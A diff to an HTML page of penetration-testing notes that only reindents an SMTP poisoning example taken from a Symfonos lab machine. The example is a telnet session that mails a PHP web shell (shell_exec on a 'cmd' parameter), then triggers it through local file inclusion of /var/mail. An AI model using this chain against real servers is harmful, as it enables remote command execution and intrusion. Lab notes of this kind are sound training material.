@@ -258,26 +258,26 @@ layout: default
             <li>On internal networks you can typically send emails as anybody</li>
             <li>SMTP poisoning
                 <pre>
-                    telnet 10.0.0.12 25
-                    Trying 10.0.0.12...
-                    Connected to 10.0.0.12.
-                    Escape character is &#039;^]&#039;.
-                    220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
-                    HELO example.com
-                    250 symfonos.localdomain
-                    mail from: hacker@example.com
-                    250 2.1.0 Ok
-                    rcpt to: helios@symfonos.localdomain
-                    250 2.1.5 Ok
-                    data
-                    354 End data with &amp;lt;CR&amp;gt;&amp;lt;F&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
-                    subject: 
-                    &amp;lt;?php echo shell_exec($_GET[&#039;cmd&#039;]); ?&amp;gt;
-                    .
-                    250 2.0.0 Ok: queued as 8A6884082B
-                    quit
-                    221 2.0.0 Bye
-                    Connection closed by foreign host.
+telnet 10.0.0.12 25
+Trying 10.0.0.12...
+Connected to 10.0.0.12.
+Escape character is &#039;^]&#039;.
+220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
+HELO example.com
+250 symfonos.localdomain
+mail from: hacker@example.com
+250 2.1.0 Ok
+rcpt to: helios@symfonos.localdomain
+250 2.1.5 Ok
+data
+354 End data with &amp;lt;CR&amp;gt;&amp;lt;F&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
+subject: 
+&amp;lt;?php echo shell_exec($_GET[&#039;cmd&#039;]); ?&amp;gt;
+.
+250 2.0.0 Ok: queued as 8A6884082B
+quit
+221 2.0.0 Bye
+Connection closed by foreign host.
                 </pre>
             </li>
             <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
